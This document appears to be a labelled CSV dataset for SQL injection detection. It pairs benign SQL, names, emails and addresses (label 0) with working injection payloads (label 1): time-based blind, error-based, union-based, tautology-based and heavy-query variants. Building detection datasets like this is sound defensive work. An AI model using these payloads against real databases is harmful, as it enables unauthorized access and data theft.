Query,Label
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""jbty"" like ""jbty",1
"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",1
SELECT * FROM pink WHERE having NOT BETWEEN 'nervous' AND 'maybe',0
"1"" where 1386  =  1386",1
ibarra,0
2.82171E+15,0
1%'   )    )     )   and sleep  (  5  )  #,1
protectorio,0
4259,0
81208495a,0
SELECT * FROM social WHERE run BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM spent WHERE least = 'active' LIMIT 3,0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,1
decacque,0
SELECT * FROM supply ORDER BY pocket,0
45250,0
caada del hoyo,0
"1  )   union all select null,null,null,null--",1
"  SELECT separate,this FROM gone WHERE island = 'zero' UNION SELECT promised, block FROM disappear",0
"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
"1'  )   and make_set  (  9961  =  6559,6559  )   and   (  'exde'  =  'exde",1
aldearrodrigo,0
SELECT * FROM yes WHERE strength NOT BETWEEN 'country' AND 'tie',0
SELECT AVG ( sport ) FROM facing,0
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
5.88977E+15,0
SELECT * FROM potatoes WHERE simplest = 'felt'  AND  ( alphabet = 'skin' OR group = 'pilot' ) ,0
-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,1
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""%""  =  """,1
"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,1
SELECT railroad ( s )  FROM bar LEFT JOIN,0
palmieri layi,0
SELECT TOP 3 * FROM source WHERE held = 'hard',0
60201082p,0
1  )   as xtgr where 1545  =  1545,1
"1""  )   as rovd where 3764  =  3764 and elt  (  4249  =  4249,7259  )  --",1
"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1'+  (  select 'myrb' where 3622  =  3622 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
SELECT * FROM typical ORDER BY struggle,0
SELECT TOP 3 * FROM trunk WHERE great = 'mental' SELECT * FROM trick,0
4430,0
SELECT * FROM differ WHERE blanket = 'bet',0
1' waitfor delay '0:0:5',1
SELECT * FROM sudden WHERE bill IN  ( SELECT spend FROM something ) ,0
"  SELECT trunk,bare,speak FROM mirror LEFT JOIN Orders ON leader.streamID =  species.hearing ORDER BY feel.anything",0
1%'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',1
arimany aguila,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,1
1 order by 1--,1
SELECT lack,0
"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""tlpw""  =  ""tlpw",1
seymour@evelin.gn,0
juglandea,0
terl6z,0
25182,0
SELECT * FROM found WHERE ride BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM standard WHERE    NOT nature = 'anyway',0
SELECT steam ( s )  FROM useful UNION ALL,0
"-9175'   )    )    union all select 6174,6174,6174,6174--",1
86m-bra,0
SELECT camera ( s )  FROM principle,0
xtiva,0
SELECT * FROM  ( SELECT hunt FROM shelf ) ,0
"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--",1
57418420r,0
urkiaga,0
SELECT * FROM climate 3,0
whorf.laporte@sindualidad.fo,0
SELECT drive ( s )  FROM rest SELECT roll ( s ) ,0
SELECT * FROM certain WHERE trouble = 'thou',0
poncin@todobetis.mil,0
capella,0
SELECT * FROM yellow WHERE    NOT now = 'bend',0
"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
pladeval berganciano,0
lazlo,0
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'lshk' like 'lshk",1
SELECT * FROM somewhere 3 SELECT * FROM damage,0
pampanas soto,0
"c/ jose belso castao, s/n,",0
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",1
ntpadmin,0
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",1
SELECT DISTINCT shape FROM carbon,0
lester_muenster@erasmusrooms.org,0
"-4905"" union all select 6082,6082--",1
"1""   )    )     )   and 2006  =  2006",1
"elt  (  5953  =  5953,1  )  ",1
doortje,0
latin,0
SELECT COUNT ( DISTINCT no )  FROM there,0
85,0
SELECT COUNT ( baby ) FROM recent,0
"-6770"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1
SELECT COUNT ( DISTINCT gently )  FROM magnet,0
1008,0
SELECT * FROM glass,0
8271,0
-9100  )   or 8792  =  9550--,1
"1""   )    )    as duny where 3756  =  3756 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
712,0
SELECT * FROM slowly WHERE metal BETWEEN '1996-07-01' AND '1996-07-31',0
1 where 1636  =  1636 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
45699398p,0
SELECT TOP 50 PERCENT * FROM compound,0
abraham,0
SELECT * FROM anybody FETCH FIRST 50 PERCENT ROWS ONLY,0
1   )    )    or sleep  (  5  )  #,1
"  SELECT circus,properly FROM alive WHERE slowly = 'stopped' UNION SELECT hundred, children FROM sail",0
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"  UPDATE favorite SET exchange =  'somewhere', City =  'case' WHERE original =  aboard",0
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0
SELECT mix ( s )  FROM solar UNION,0
-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'xmwj'  =  'xmwj",1
SELECT option_value FROM wp_options WHERE option_name  =  'can_compress_scripts' LIMIT 1,0
1   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  3919  =  3919,1
SELECT * FROM corn WHERE where = 'alive'  OR cow = 'at',0
-2936  )   or 6872  =  6872,1
"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",1
"1""   )    )    as qrrx where 4633  =  4633 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  1205  =  1205",1
SELECT * FROM return WHERE NOT song = 'construction'  AND NOT willing = 'cap',0
"select * from generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   limit 1--",1
belva,0
"  SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )  ",0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",1
"-1748%""   )    )     )   union all select 2987#",1
SELECT COUNT ( DISTINCT letter )  FROM stock,0
"1'+  (  select pepf where 5071  =  5071 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
 (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,1
"1%'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1
SELECT DISTINCT command FROM gradually,0
"1'  )   as jxqt where 4322  =  4322 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
4.43607E+15,0
SELECT power ( s )  FROM instant,0
admin' --,1
1%'   )    )    and 3721  =  2597#,1
1'  )   as qqyz where 2274  =  2274,1
84881293t,0
"INSERT INTO specific  ( did, simplest, happily )  VALUES  ( 'great', 'left', 'above' )  ",0
if  (  8264  =  1939  )   select 8264 else drop function nsoq--,1
14973109v,0
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1
1'||  (  select 'ylio' from dual where 3767  =  3767 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1
"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT * FROM down 3 SELECT * FROM applied,0
SELECT column_name FROM table_name WHERE column_name operator ALL,0
SELECT COUNT ( stateID ) FROM account,0
"1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
1  )   where 9307  =  9307,1
"SELECT CHAR_LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0
1 and sleep  (  5  )  -- ruuv,1
" end and   (  ""nuix"" like ""nuix",1
1'  )   where 5214  =  5214,1
31153,0
dao,0
"  SELECT quick,equator,child FROM press LEFT JOIN Orders ON increase.suggestID =  master.village ORDER BY route.tent",0
1'  )   where 4500  =  4500,1
"1""   )    )    as rpxd where 4929  =  4929",1
"-3963"" or 1224  =  5119",1
SELECT * FROM club WHERE with  BETWEEN 10 AND 20,0
SELECT * FROM buffalo WHERE copy IN  ( SELECT maybe FROM division ) ,0
SELECT * FROM meal WHERE brick = 'course'  OR island = 'feature',0
"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",1
SELECT * FROM express FETCH FIRST 50 PERCENT ROWS ONLY,0
murillo el cuende,0
arrestar,0
matungo,0
"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1
"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",1
"-2044%'   )    )    or elt  (  9299  =  3618,3618  )   and    (    (   '%'  =  '",1
"  SELECT fallenID AS ID, certain AS stay FROM supply",0
SELECT describe ( s )  FROM hay FULL OUTER JOIN,0
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl",1
"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",1
revesa,0
"c/ ricardo gutierrez 26, 8-d",0
14638777j,0
SELECT * FROM into WHERE feet = 'ice'  OR chosen = 'skin',0
taspatch,0
62,0
"paseo rey, 167 8-f",0
47651101t,0
"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",1
karkotsk,0
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1
baff@enhierro.com.ec,0
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # zwck",1
8318,0
1%' and 4595  =  4595#,1
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1
"   SELECT COUNT ( unhappy ) , tomorrow FROM load BY develop",0
rigas.albalak@albeiteria.it,0
sugesto,0
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0
"emilio arrieta, 110, 1f",0
3471,0
50835477a,0
SELECT * FROM put ORDER BY cowboy DESC,0
"INSERT INTO seldom  ( tomorrow, nearly, scientific )  VALUES  ( 'grew', 'vegetable', 'tongue' )  ",0
galce,0
empel6tarse,0
SELECT * FROM complete WHERE ride NOT BETWEEN 'proper' AND 'fall',0
"1%'   )    )    union all select null,null,null,null,null#",1
nehemiah,0
"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",1
"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",1
1'  )   where 4509  =  4509 union all select null--,1
SELECT * FROM them WHERE money = 'straight' LIMIT 3,0
-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,1
SELECT * FROM unit WHERE Price NOT BETWEEN 10 AND 20,0
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,1
SELECT * FROM method WHERE thought NOT LIKE '[police]%',0
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
15423399j,0
SELECT * FROM bend  WHERE own NOT LIKE '[needle]%',0
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'qiau'  =  'qiau,1
"1""  )   or sleep  (  5  )  #",1
SELECT AVG ( instance ) FROM spite,0
lubna,0
SELECT TOP 3 * FROM being SELECT * FROM like 3SELECT * FROM trade,0
"admin""or 1  =  1 or """"  =  """,1
"  SELECT verb,blind,loss FROM hit LEFT JOIN Orders ON shore.careID =  string.water ORDER BY first.strike",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9369 )  ORDER BY meta_id ASC",0
"alonso de mendoza, 31 3b",0
2.14581E+15,0
SELECT daily ( s )  FROM shorter LEFT JOIN,0
"  SELECT YEARWEEK ( ""2017-10-25"" ) ;",0
 UPDATE express SET several = 'young'WHERE route = 'paper',0
x' AND 1  =    (  SELECT COUNT  (  *  )   FROM tabname  )  ; --,1
select   (  case when   (  1005  =  5996  )   then 1 else 1005*  (  select 1005 from master..sysdatabases  )   end  )  --,1
"gredos, 114 12?g",0
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
SELECT eager,0
end# thjv,1
SELECT * FROM riding WHERE    NOT work = 'known',0
1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',1
"c/ avi xaxu, 157,",0
"c/ paterna, s/n, 11h",0
cerpa oitavn,0
SELECT COUNT ( opposite ) FROM it,0
"-1766""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""ydzq"" like ""ydzq",1
SELECT * FROM lose 3,0
SELECT * FROM hit WHERE brick NOT LIKE '[similar]%',0
SELECT AVG ( happen ) FROM unusual,0
"1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
imperial 143,0
-5327'   )    )     )   or 1606  =  6099,1
jiyuan,0
-7037'   )    )    as epsg where 3684  =  3684 union all select 3684--,1
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
"  SELECT SUBSTRING ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;",0
2252,0
"  SELECT wasteID AS ID, surprise AS morning FROM whole",0
"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT TAN ( 1.75 ) ;,0
v,1
seno,0
"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",1
" SELECT * FROM mirror ORDER BY too ASC, particularly DESC",0
-9120'   )    )    or 8571  =  8571--,1
1'  )   where 5378  =  5378,1
 UPDATE flame SET wish = 'mouth'WHERE lovely = 'cave',0
"-3930%""   )    )    order by 1#",1
"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'qfls'  =  'qfls",1
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",1
8167,0
"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,1
"make_set  (  6174  =  9734,1  )  ",1
demoniaca,0
 UPDATE broken SET may = 'universe'WHERE managed = 'dress',0
"1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
den21o9a,0
cauthen3,0
SELECT * FROM those,0
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT AVG ( Price ) FROM clay,0
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'vvxk'  =  'vvxk,1
SELECT * FROM branch WHERE result = 'window' FETCH FIRST 3 ROWS ONLY,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo",1
SELECT zebra FROM largest UNION SELECT mood FROM increase ORDER BY closely,0
l-e3a06l,0
"INSERT INTO laugh ( ants, increase, youth, fight, breath, pride )  VALUES  ( 'rough', 'freedom'. victory', 'hardly', 'took', 'standard', 'easier' )  ",0
SELECT COUNT ( men )  FROM certainly,0
" SELECT * FROM arrow ORDER BY mud ASC, past DESC",0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
SELECT AVG ( space ) FROM live SELECT SUM ( party ) ,0
" SELECT column_name ( s )  FROM itself,atom",0
"1' in boolean mode  )   union all select null,null,null,null,null,null--",1
‘ or 1  =  1 --,1
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'obmu'  =  'obmu",1
"c/ murillo, 106 5c",0
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",1
1%'   )    )    and 7160  =  7249--,1
SELECT FLOOR ( 25 ) ;,0
-4904'  )   as ogyu where 2821  =  2821 or 5982  =  1643,1
"-1065   )    )    union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1
SELECT * FROM Customers  WHERE CustomerName LIKE '%a';,0
31819774x,0
gurica4,0
SELECT AVG ( arrow ) FROM parent SELECT SUM ( atomic ) ,0
"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",1
 UPDATE would SET through = 'wrapped'WHERE family = 'film',0
SELECT * FROM  ( SELECT gradually FROM sharp ) ,0
"c/ boabdil, 91",0
cenicientos,0
"select * from generate_series  (  7724,7724,case when   (  7724  =  8170  )   then 1 else 0 end  )   limit 1--",1
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
-9191'  )   as qtvm where 2838  =  2838 or   (  8459  =  8459  )  *4906--,1
"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
SELECT * FROM person FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM frog,0
"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM roar,0
asisia,0
"calle bruno ayllon, 142, 3?c",0
nadav6,0
"-8205' or elt  (  6581  =  3480,3480  )   and 'sosv'  =  'sosv",1
"SELECT POSITION ( ""COM"" IN ""W3Schools.com"" )  AS MatchPosition;",0
idefonsa,0
39527,0
esplendoroso,0
"alqueria de coca 38,",0
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
humfrey,0
"1"" where 6347  =  6347 union all select null,null,null,null,null,null,null,null#",1
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1
DELETE FROM hot,0
"plza. salamanca 39,",0
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,0
SELECT MIN ( most )  AS shot FROM safe,0
gomero gallardo,0
fanning_shepherd@bruoseguridad.name,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",1
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'cfzp' like 'cfzp",1
SELECT *,0
1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,1
"INSERT INTO south ( second, distant, exclaimed, exactly, wealth, sure )  VALUES  ( 'factor', 'bus'. arrive', 'lucky', 'on', 'nails', 'column' )  ",0
SELECT period ( s )  FROM allow FULL OUTER JOIN,0
"INSERT INTO began  ( main, break, continued )  VALUES  ( 'accident', 'nation', 'fireplace' )  ",0
sotobaado y priorato,0
SELECT * FROM someone FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'wmrr' like 'wmrr",1
timb44,0
-3125'   )    )     )   order by 1#,1
SELECT DISTINCT circle FROM activity,0
SELECT * FROM football,0
"-8544%"" or 6872  =  6872 and ""%""  =  """,1
SELECT MIN ( choice )  AS play FROM extra,0
"  SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.feltID ORDER BY Orders.totalID",0
"""  )   or   (  ""x""  )    =    (  ""x",1
"  SELECT especially,pile FROM poor WHERE fact = 'sand' UNION SELECT up, activity FROM gentle",0
SELECT option_value FROM wp_options WHERE option_name  =  'webp-express-alter-html' LIMIT 1,0
SELECT * FROM store FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM nuts,0
SELECT AVG ( myself )  FROM phrase  SELECT SUM ( track ) ,0
52930776w,0
po29ip1t0l6,0
